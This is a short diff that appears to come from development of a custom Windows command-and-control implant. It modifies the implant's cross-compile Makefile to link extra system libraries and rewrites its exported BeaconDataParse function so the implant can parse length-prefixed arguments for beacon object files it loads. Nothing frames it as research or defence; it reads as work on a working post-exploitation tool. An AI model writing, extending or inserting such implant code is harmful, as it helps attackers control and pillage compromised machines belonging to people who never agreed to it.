@@ -177,7 +177,7 @@ chmod +x build.sh && ./build.sh
 cat > Makefile << EOF
 .PHONY: windows clean upx
 windows: beacon.c
-	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c COFFLoader.o -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -lole32 -loleaut32 -luser32 -lntdll -DUNICODE -D_UNICODE -D_CRT_SECURE_NO_WARNINGS  
+	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c COFFLoader.o -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -lole32 -loleaut32 -luser32 -lntdll -lpsapi -lnetapi32 -lmpr -lsecur32 -DUNICODE -D_UNICODE -D_CRT_SECURE_NO_WARNINGS  
 clean:
 	#rm -f $OUTPUT beacon.c
 upx:
@@ -1014,10 +1014,21 @@ void handleAdversary(char* command);
 
 // === Beacon API: implementaciones exportables para BOFs ===
 
-__declspec(dllexport) void BeaconDataParse(datap * parser, char * buffer, int size) {
+__declspec(dllexport) void BeaconDataParse(datap *parser, char *buffer, int size) {
+    if (size >= 4) {
+        int32_t declared = *(int32_t *)buffer;
+        if (declared >= 0 && (declared + 4) == size) {
+            /* formato oficial: saltamos los 4 bytes de longitud */
+            parser->original = buffer;
+            parser->buffer   = buffer + 4;
+            parser->length   = declared;
+            return;
+        }
+    }
+
     parser->original = buffer;
-    parser->buffer = buffer;
-    parser->length = size;
+    parser->buffer   = buffer;
+    parser->length   = size;
 }
 
 __declspec(dllexport) char * BeaconDataPtr(datap * parser, int size) {
